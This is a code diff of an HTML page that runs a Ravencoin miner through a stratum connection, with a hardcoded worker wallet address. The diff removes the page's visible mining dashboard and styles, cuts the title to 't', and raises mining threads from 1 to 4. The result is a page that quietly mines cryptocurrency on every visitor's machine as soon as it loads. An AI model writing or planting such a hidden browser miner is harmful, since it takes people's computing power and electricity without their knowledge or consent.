@@ -4,28 +4,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Mining Dashboard</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-    }
-    .info {
-      margin-top: 20px;
-    }
-    .info div {
-      margin-bottom: 10px;
-    }
-  </style>
+  <title>t</title>
 </head>
 
 <body>
-  <h1>Mining Dashboard</h1>
-  <div class="info">
-    <div>Hashrate: <span id="hashrate">0</span></div>
-    <div>Job: <span id="job">None</span></div>
-    <div>Shares: <span id="shares">0</span></div>
-  </div>
-
   <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
   <script src="app.js"></script>
   <script>
@@ -34,67 +16,17 @@
       port: 7019,
       worker: "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q",
       password: "c=RVN"
-    };
-
-    let hashrate = 0;
-    let shares = 0;
-    let currentJob = "None";
-
-    function updateUI() {
-      document.getElementById('hashrate').textContent = hashrate;
-      document.getElementById('job').textContent = currentJob;
-      document.getElementById('shares').textContent = shares;
-    }
-
-    function mine({ stratum, options }) {
-      const socket = io(`${stratum.server}:${stratum.port}`);
-
-      socket.on('connect', () => {
-        console.log('Connected to server');
-        socket.emit('mining.subscribe', [stratum.worker, stratum.password]);
-      });
-
-      socket.on('mining.notify', (job) => {
-        currentJob = job[0];
-        updateUI();
-        console.log('New job received:', job);
-      });
-
-      socket.on('mining.set_difficulty', (difficulty) => {
-        console.log('Difficulty set to:', difficulty);
-      });
-
-      socket.on('mining.hashrate', (rate) => {
-        hashrate = rate;
-        updateUI();
-        console.log('Hashrate:', rate);
-      });
-
-      socket.on('mining.submit', (result) => {
-        if (result.status === 'accepted') {
-          shares += 1;
-          updateUI();
-          console.log('Share accepted:', result);
-        } else {
-          console.log('Share rejected:', result);
-        }
-      });
-
-      if (options.log) {
-        socket.on('log', (message) => {
-          console.log('Log:', message);
-        });
-      }
     }
 
     mine({
+      // required
       stratum,
+      // optional
       options: {
         log: true, // enables/disables logs
-        threads: 1
-      
+        threads: 4
       }
-    });
+    })
   </script>
 </body>
 
